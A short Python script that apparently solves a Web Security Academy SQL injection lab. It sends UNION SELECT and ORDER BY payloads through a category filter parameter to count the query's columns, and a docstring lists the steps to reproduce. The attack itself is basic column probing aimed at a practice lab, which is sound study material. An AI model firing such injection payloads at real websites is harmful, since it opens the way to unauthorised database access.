#!/usr/bin/env python3

import requests, re

URL = 'https://0a38006104f5452680923a3c00510001.web-security-academy.net/filter'

def run(payload):
    r = requests.get(URL, params={'category': payload})
    body = r.text
    print(f'[*] Payload: {payload}')
    print(f'[*] Status: {r.status_code}')

    if r.status_code == 500:
        print('[!] Error → SQL confirmed / bad syntax')

    if re.search(r'Congratulations|solved the lab', body):
        print('[✓] SOLVED')

    items = re.findall(r'<th>(.*?)</th>', body)
    if items:
        print(f'[✓] Found {len(items)} list:')
        for item in items:
            clean = item.strip()
            if clean:
                print(f' → {clean}')

run("Pets' union select null, null, null--")
# run("Pets' order by 3--")


"""
Steps to Reproduce

1. Open browser and access to this endpoint: `/filter?category=Pets`
2. Use `Pets' union select null, null, null--` to determine how many column that vulnerability query using.
3. Or Use `Pets' order by 3--`.
"""